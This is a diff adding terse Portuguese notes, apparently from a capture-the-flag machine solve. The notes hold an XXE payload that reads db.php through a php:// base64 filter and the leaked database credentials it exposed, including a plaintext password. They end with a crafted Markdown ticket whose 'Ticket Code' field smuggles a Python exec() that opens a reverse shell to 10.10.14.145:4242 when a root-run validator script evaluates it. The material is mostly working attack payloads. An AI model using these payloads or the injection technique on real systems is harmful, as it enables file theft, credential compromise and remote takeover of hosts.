@@ -1,0 +1,29 @@
+Converter esse codigo para base64/URL Encode
+
+<?xml  version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=db.php"> ]>
+		<bugreport>
+		<title>&xxe;</title>
+		<cwe>test</cwe>
+		<cvss>test</cvss>
+		<reward>test</reward>
+		</bugreport>
+
+<?php
+// TODO -> Implement login system with the database.
+$dbserver = "localhost";
+$dbname = "bounty";
+$dbusername = "admin";
+$dbpassword = "m19RoAU0hP41A1sTsq6K";
+$testuser = "test";
+
+development:m19RoAU0hP41A1sTsq6K
+
+/usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
+
+criar um arquivo .md
+
+# Skytrain Inc 
+## Ticket to abc 
+__Ticket Code:__
+**102+ 10 == 112 and exec('import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.145",4242));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);')
